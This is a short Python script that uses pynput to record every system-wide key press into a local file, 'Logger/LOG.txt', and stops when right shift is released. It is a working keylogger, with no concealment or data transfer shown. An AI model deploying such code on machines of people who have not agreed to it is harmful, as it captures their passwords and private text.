from pynput.keyboard import Listener
from datetime import datetime as dt


def convert_key(key) -> str:
    return str(key).replace("'", '').split('.')[-1]


def save_time(file: str, name, extra_endline=False) -> None:
    with open(file, 'a') as f:
        f.write(name + str(dt.now()) + '\n' * (2 if extra_endline else 1))


def on_press(key) -> None:
    key = convert_key(key)
    with open('Logger/LOG.txt', 'a') as file:
        if len(key) == 1:
            file.write(key)
        elif len(key) > 1 and key != 'space':
            file.write('\n' + key + '\n')
        else:
            file.write('\n')


def on_release(key) -> bool | None:
    key = convert_key(key)
    return False if key == 'shift_r' else None


def keyboard_listener() -> None:
    with Listener(on_press=on_press, on_release=on_release) as keyboard:
        keyboard.join()


if __name__ == '__main__':
    print(convert_key('Key.ctrl_l'))
    print(convert_key('Key.shift_r'))
    print(convert_key('Key.a'))
    print(convert_key('Key.esc'))
